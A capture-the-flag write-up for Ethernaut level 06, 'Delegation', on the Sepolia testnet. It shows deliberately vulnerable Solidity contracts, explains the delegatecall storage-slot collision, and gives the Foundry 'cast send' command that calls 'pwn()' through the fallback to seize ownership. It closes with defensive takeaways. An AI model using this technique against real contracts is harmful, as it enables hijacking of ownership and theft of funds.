# 06 - Delegation

## Overview

- **Difficulty:** 4/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x836a094abf84924E15154b04de5845Fd2ecd5750`](https://sepolia.etherscan.io/address/0x836a094abf84924E15154b04de5845Fd2ecd5750)
- **Transactions:**
  - **1. Exploit (`pwn()` via fallback delegatecall):** [`0x226200520b833bd83a6f634da089a7bdb2cac9b76aaf57f8dfc68adecc909d71`](https://sepolia.etherscan.io/tx/0x226200520b833bd83a6f634da089a7bdb2cac9b76aaf57f8dfc68adecc909d71)
  - **2. Level Submission:** [`0x1b12ec4f45a13f1c99de631fb91820ea084a16757ae7e85abb45d7dee49454a0`](https://sepolia.etherscan.io/tx/0x1b12ec4f45a13f1c99de631fb91820ea084a16757ae7e85abb45d7dee49454a0)

---

## Objective

Claim ownership of the `Delegation` contract instance.

---

## Contract Analysis

The target contracts are in [`src/06-Delegation/Delegation.sol`](./Delegation.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

---

### Core Concept: `call` vs `delegatecall`

In the EVM, external calls can be made using standard `call` or `delegatecall`:

| Feature | Standard `call` | `delegatecall` |
| :--- | :--- | :--- |
| **Execution Context** | Target contract | **Calling contract** |
| **Storage Modified** | Target contract's storage | **Calling contract's storage** |
| **`msg.sender`** | Calling contract | **Original caller (`msg.sender` preserved)** |
| **`msg.value`** | Passed value | **Original value (`msg.value` preserved)** |

When Contract A performs a `delegatecall` to Contract B:
> Contract A essentially says: *"Execute Contract B's code, but apply all state changes directly to **my** storage, and keep `msg.sender` and `msg.value` as they were when I was called."*

---

### Vulnerability Breakdown

#### 1. Storage Slot Alignment
Solidity assigns state variables to 32-byte storage slots sequentially starting from slot 0:

- **`Delegate` Contract Storage Layout:**
  - `slot 0`: `address public owner`

- **`Delegation` Contract Storage Layout:**
  - `slot 0`: `address public owner`
  - `slot 1`: `Delegate delegate`

Notice that both contracts have `owner` mapped to **`slot 0`**.

#### 2. Unrestricted Fallback Function
The `Delegation` contract defines a `fallback()` function:

```solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

Whenever a transaction is sent to `Delegation` with calldata that does not match any function signature in `Delegation` (e.g. `pwn()`), the `fallback()` triggers automatically and passes all of `msg.data` directly into `address(delegate).delegatecall(...)`.

#### 3. Execution Flow
```text
[ Player EOA ]
      │
      │ 1. Calls Delegation with msg.data = abi.encodeWithSignature("pwn()")
      ▼
[ Delegation Contract ] (fallback triggers)
      │
      │ 2. address(delegate).delegatecall(msg.data)
      ▼
[ Delegate Contract ]
      │
      │ 3. Executes pwn(): owner = msg.sender;
      │    Because of delegatecall, this writes msg.sender into SLOT 0
      │    of the CALLER contract (Delegation)!
      ▼
[ Delegation Contract Storage ]
      │
      └───▶ Slot 0 (Delegation.owner) becomes Player EOA!
```

---

## Step-by-Step Exploit Walkthrough

Because this attack does not require an intermediate smart contract, we can execute the entire exploit via a single command using Foundry's `cast`.

### 1. Trigger `fallback()` with `pwn()` Calldata

The 4-byte function selector for `pwn()` is:
$$\text{bytes4}(\text{keccak256}(\text{"pwn()"})) = \text{0xdd365b8b}$$

Sending this selector to `Delegation` invokes the `fallback` function, executing `Delegate.pwn()` in the context of `Delegation`:

```bash
cast send 0x836a094abf84924E15154b04de5845Fd2ecd5750 "pwn()" \
  --rpc-url sepolia \
  --account <YOUR_ACCOUNT>
```

- **Tx Hash:** [`0x226200520b833bd83a6f634da089a7bdb2cac9b76aaf57f8dfc68adecc909d71`](https://sepolia.etherscan.io/tx/0x226200520b833bd83a6f634da089a7bdb2cac9b76aaf57f8dfc68adecc909d71)

### 2. Verify Ownership Transfer

Query slot 0 or call `owner()` on `Delegation`:

```bash
cast call 0x836a094abf84924E15154b04de5845Fd2ecd5750 "owner()(address)" \
  --rpc-url sepolia
```

- **Result:** Returns the player's address (`0xf511E1029dE5295f6D0dE05f4431DdA203e63607`).

### 3. Submit Level

Submit the challenge instance on Ethernaut:

- **Submission Tx:** [`0x1b12ec4f45a13f1c99de631fb91820ea084a16757ae7e85abb45d7dee49454a0`](https://sepolia.etherscan.io/tx/0x1b12ec4f45a13f1c99de631fb91820ea084a16757ae7e85abb45d7dee49454a0)

---

## Key Security Takeaways

1. **`delegatecall` is High-Risk:**
   `delegatecall` gives the target contract complete control over the calling contract's state, balance, and execution flow. It must be treated with extreme caution.
2. **Never Forward Arbitrary Calldata to Untrusted Implementations:**
   A fallback that passes arbitrary `msg.data` to an implementation contract with exposed public administrative functions (like `pwn()`) allows anyone to hijack the caller.
3. **Storage Layout Collisions:**
   When using proxy patterns (ERC-1967, UUPS, Diamond), ensure storage slots are strictly aligned or use unstructured/diamond storage to avoid unintended state corruption.
4. **Use Solidity `library` for Stateless Code Execution:**
   Solidity libraries prevent state variable declarations in the library itself, ensuring that delegated calls cannot accidentally overwrite arbitrary caller storage variables.
